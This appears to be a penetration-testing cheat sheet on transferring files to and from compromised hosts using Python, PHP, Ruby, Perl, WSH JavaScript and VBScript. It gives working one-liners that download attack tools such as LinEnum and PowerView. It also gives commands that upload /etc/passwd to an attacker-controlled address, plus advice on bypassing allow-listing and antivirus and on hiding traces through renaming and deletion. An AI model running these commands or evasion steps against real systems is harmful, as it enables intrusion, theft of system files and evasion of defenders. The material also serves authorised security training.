## Overview

When common tools such as **wget**, **curl**, or **scp** are unavailable, we can still transfer files using **native programming languages** often already installed on target systems.

Advantages:

- Living off the land (LOLBins concept)
- Reduced need to upload tooling
- Works in restricted environments
- Often bypasses application allow-listing
- Flexible for download and upload operations

Common languages encountered:

- Python
- PHP
- Ruby
- Perl
- JavaScript (Windows Script Host)
- VBScript
- PowerShell (covered separately)

---

# Python

Python frequently exists on Linux targets and sometimes Windows.

Supports inline execution:

```bash
python -c '<code>'
```

---

## Python 2 Download

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'
```

---

## Python 3 Download

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'
```

---

## Python 3 Upload (HTTP POST)

Start upload server on attacker host:

```bash
python3 -m uploadserver
```

Upload file:

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

## Python Upload Expanded

```python
import requests

URL = "http://192.168.49.128:8000/upload"

file = open("/etc/passwd","rb")

r = requests.post(URL, files={"files":file})
```

# PHP

PHP is extremely common on web servers.

Inline execution:

```bash
php -r '<code>'
```

---

## PHP Download using file_get_contents()

```bash
php -r '$file=file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh");file_put_contents("LinEnum.sh",$file);'
```

---

## PHP Download using fopen()

```bash
php -r 'const BUFFER=1024;$fremote=fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","rb");$flocal=fopen("LinEnum.sh","wb");while($buffer=fread($fremote,BUFFER)){fwrite($flocal,$buffer);}fclose($flocal);fclose($fremote);'
```

---

# Ruby

Ruby supports HTTP download via Net::HTTP.

```bash
ruby -e 'require "net/http";File.write("LinEnum.sh",Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

# Perl

Perl often exists on legacy Unix systems.

```bash
perl -e 'use LWP::Simple;getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh");'
```

# JavaScript (Windows)

Uses Windows Script Host.

Create file:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Save as:

```
wget.js
```

Execute:

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

# VBScript (Windows)

Create file:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Save as:

```
wget.vbs
```

Execute:

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

# When to Use Code-Based Transfers

| Scenario | Benefit |
|----------|---------|
| no wget/curl available | use built-in language runtime |
| restricted shell | one-liners reduce footprint |
| AV restrictions | blend with legitimate binaries |
| webshell access | PHP often already available |
| Windows locked environment | WSH often enabled |
| upload required | Python requests simplifies POST |

# Mental Model

Most languages provide HTTP client libraries.

Core pattern:

```
request remote resource
store response locally
```

Upload pattern:

```
read local file
send POST request
receive server confirmation
```

# OPSEC Considerations

Artifacts created:

- command history
- downloaded files
- temporary scripts
- outbound HTTP requests

Detection vectors:

- proxy logs
- EDR telemetry
- unusual scripting activity
- suspicious GitHub access

Reduce exposure:

- remove files after use
- use HTTPS where possible
- rename files innocuously
- avoid noisy large transfers
